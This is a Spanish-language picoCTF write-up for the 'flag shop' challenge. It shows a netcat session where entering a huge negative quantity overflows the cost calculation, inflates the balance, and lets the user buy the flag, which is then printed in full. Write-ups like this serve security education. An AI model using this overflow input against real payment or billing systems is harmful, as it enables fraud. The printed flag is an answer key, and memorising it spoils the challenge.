### Descripción
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c). Connect with `nc jupiter.challenges.picoctf.org 9745`.

Hints:
1. Two's compliment can do some weird things when numbers get really big!

### Solución
Conectándonos al servidor:

```
Sebas115-picoctf@webshell:~$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
-1000000000000000000

The final cost is: -2073034752

Your current balance after transaction: 2073035852

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 2073035852 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
```

Aquí lo que se hizo fue introducir una cantidad muy grande negativa que provoca un desbordamiento de los enteros, con el fin de que el costo al final se vuelva negativo y nos aumente el saldo.
Entonces con el saldo ahora si es posible comprar la bandera.

Flag: 
picoCTF{m0n3y_bag5_65d67a74}

### Notas adicionales

### Referencias
